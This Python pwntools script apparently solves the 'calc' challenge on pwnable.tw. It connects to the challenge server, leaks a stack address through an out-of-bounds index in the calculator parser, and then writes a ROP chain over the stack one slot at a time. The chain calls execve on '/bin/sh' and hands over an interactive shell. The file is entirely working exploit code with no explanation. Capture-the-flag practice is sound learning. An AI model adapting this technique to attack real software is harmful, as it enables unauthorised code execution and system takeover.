from pwn import *

local = False
elf = 'calc' 

if local: 
    context.binary = './'+elf
    r = process("./"+elf)
else: 
    ip = "chall.pwnable.tw"
    port = 10100
    r = remote(ip,port)

context.arch = 'i386'

raw_input("aa")

pop_eax = 0x805c34b
pop_edx_ecx_ebx=0x80701d0
int_80=0x8049a21
 
r.recv()
r.sendline("+360")

save_ebp = int(r.recv())
rop_addr = save_ebp + 0xffffcc9c - 0xffffccb8
success("rop_addr : %s",hex(save_ebp & 0xffffffff))

rop_chain=[ pop_eax , 11 , pop_edx_ecx_ebx , 0 , 0 , rop_addr + 7 * 4 , int_80 , u32("/bin") , u32("/sh\x00")]

count = 0
for i in range(1,10):
	s1 = "+36"+str(i)
	r.sendline(s1)
	print s1
	value = int(r.recv())
	diff = rop_chain[count] - value
	count = count + 1
	if(diff < 0):
		s2 = "+36" + str(i) + str(diff)
		r.sendline(s2)
		print s2
	else:
		s2 = "+36"+str(i)+"+" + str(diff)
		r.sendline(s2)
		print s2
	r.recv()
r.send("\n")
r.interactive()

# b *0x8049433